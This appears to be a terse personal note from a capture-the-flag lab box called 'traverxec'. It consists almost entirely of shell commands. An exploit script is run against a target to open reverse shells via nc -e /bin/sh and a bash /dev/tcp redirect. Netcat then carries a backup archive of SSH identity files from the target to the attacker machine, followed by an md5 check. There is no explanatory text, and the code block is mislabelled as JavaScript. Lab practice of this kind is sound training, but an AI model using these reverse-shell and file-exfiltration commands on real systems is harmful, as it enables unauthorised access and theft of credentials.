  

```JavaScript
python2 47837.py 10.10.10.165 80 "nc 10.10.16.12 8888  -e /bin/sh"  
python2 47837.py 10.10.10.165 80 '/bin/bash -c "/bin/bash -i &> /dev/tcp/10.10.16.12/4343 0>&1"'



python -m http.server 8000

python -m http.server 8000
python -m SimpleHTTPServer 8000
 
 // send file from target to kali
 nc -lnvp 1234 > b.tgz
 www-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.16.12 1234 < backup-ssh-identity-files.tgz
```

md5sum b.tgz  
084883c47fec5b1385b50f226db8175f b.tgz